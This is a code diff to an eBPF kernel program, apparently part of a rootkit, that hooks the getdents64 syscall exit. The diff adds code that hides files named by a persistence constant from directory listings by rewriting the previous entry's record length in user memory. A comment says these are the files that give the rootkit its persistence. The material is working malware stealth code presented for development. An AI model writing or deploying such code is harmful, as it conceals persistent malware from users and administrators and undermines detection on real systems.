@@ -320,7 +320,7 @@ static __always_inline int handle_tp_sys_exit_getdents64(struct sys_getdents64_e
         if (d_type == 4){
             bpf_printk("DIR: %s\n", d_name);
             if(previous_dir != NULL){
-                if(str_n_compare(d_name, sizeof(STRING_SECRET_DIRECTORY_NAME_HIDE)-1, STRING_SECRET_DIRECTORY_NAME_HIDE, sizeof(STRING_SECRET_DIRECTORY_NAME_HIDE)-1, sizeof(STRING_SECRET_DIRECTORY_NAME_HIDE)-1)==0){
+                if(str_n_compare(d_name, sizeof(SECRET_DIRECTORY_NAME_HIDE)-1, SECRET_DIRECTORY_NAME_HIDE, sizeof(SECRET_DIRECTORY_NAME_HIDE)-1, sizeof(SECRET_DIRECTORY_NAME_HIDE)-1)==0){
                     __u16 prev_reclen;
                     bpf_probe_read(&prev_reclen, sizeof(__u16), &previous_dir->d_reclen); 
                     __u16 new_len = prev_reclen + d_reclen;
@@ -335,8 +335,23 @@ static __always_inline int handle_tp_sys_exit_getdents64(struct sys_getdents64_e
             curr_offset += d_reclen;
             continue;
         }
-        //bpf_printk("Entry found\n");
+        
+        //This hides files which achieve the persistence of the rootkit, so better not to be shown
         bpf_printk("FILE: d_reclen: %d, d_name_len: %d, %s", d_reclen, d_name_len, d_name);
+        if(previous_dir != NULL){
+            if(str_n_compare(d_name, sizeof(SECRET_FILE_PERSISTENCE_NAME)-1, SECRET_FILE_PERSISTENCE_NAME, sizeof(SECRET_FILE_PERSISTENCE_NAME)-1, sizeof(SECRET_FILE_PERSISTENCE_NAME)-1)==0){
+                __u16 prev_reclen;
+                bpf_probe_read(&prev_reclen, sizeof(__u16), &previous_dir->d_reclen); 
+                __u16 new_len = prev_reclen + d_reclen;
+                bpf_printk("Prev dir len:%d, new len:%d", prev_reclen, new_len);
+                err = bpf_probe_write_user(&(previous_dir->d_reclen), &new_len ,sizeof(__u16));
+                if(err<0){
+                    bpf_printk("Failed to overwrite directory struct length\n");
+                }
+            }
+        }
+        
+        
         //Update the pointer
         bpf_probe_read(&previous_dir, sizeof(struct linux_dirent64*), &d_entry);
         curr_offset += d_reclen;
